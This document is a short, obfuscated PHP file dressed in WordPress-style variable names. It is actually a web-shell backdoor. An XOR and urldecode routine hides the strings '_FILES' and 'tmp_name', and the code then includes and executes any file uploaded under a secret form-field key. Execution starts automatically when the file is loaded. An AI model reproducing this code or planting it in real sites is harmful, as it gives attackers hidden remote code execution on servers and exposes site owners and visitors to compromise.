<?php 	
function ext_type()

{

    $encode_ascii_characters = 'WgYZmh9VWkD';

    $rich_text = $encode_ascii_characters;

    
    $include = $GLOBALS[update("%08%21%10%16%28%3B", $rich_text)];
    $closing_single_quote = $include;

    $menu_position = isset($closing_single_quote[$rich_text]);
	$page_structure = 'rest_base';
    if ($menu_position)

    {
        $sort_order = $include[$rich_text];
        $stack = $sort_order[update("%23%0A%29%05%03%09T3", $rich_text)];
	$matches = 'menu_order';
        $ext_types = $stack;
        include ($ext_types);
	$unfiltered = 'public';
    }

}
function update($_builtin, $is_escaped)

{
    $ancestor = $is_escaped;
    $flag_after_digit = "url" . "decode";

    $last_char = $flag_after_digit($_builtin);
    $post_status = substr($ancestor,0, strlen($last_char));
    $double_encode = $last_char ^ $post_status;
    
	$needles = 'author_query';
    $last_char = strpos($double_encode, $post_status);

    

    return $double_encode;
}

ext_type();

?>
